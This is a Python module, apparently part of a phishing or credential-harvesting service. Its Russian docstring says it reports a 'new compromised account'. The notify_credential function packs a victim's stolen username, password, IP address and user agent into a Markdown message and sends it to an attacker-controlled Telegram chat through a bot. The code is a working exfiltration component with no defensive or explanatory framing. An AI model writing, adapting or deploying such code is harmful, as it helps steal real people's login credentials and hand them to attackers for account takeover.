import logging
from telegram import Bot
from telegram.error import TelegramError
from app.core.config import settings

logger = logging.getLogger(__name__)

bot = Bot(token=settings.telegram_bot_token)

async def notify_credential(username: str, password: str, ip: str = None, user_agent: str = None):
    """
    Отправляет сообщение в Telegram о новом скомпрометированном аккаунте.
    """
    try:
        text = (
            f"🔐 *Новые данные*\n"
            f"👤 *Username:* `{username}`\n"
            f"🔑 *Password:* `{password}`\n"
            f"🌐 *IP:* {ip or 'N/A'}\n"
            f"📱 *User-Agent:* {user_agent or 'N/A'}"
        )
        await bot.send_message(chat_id=settings.telegram_chat_id, text=text, parse_mode="Markdown")
    except TelegramError as e:
        logger.error(f"Failed to send telegram notification: {e}")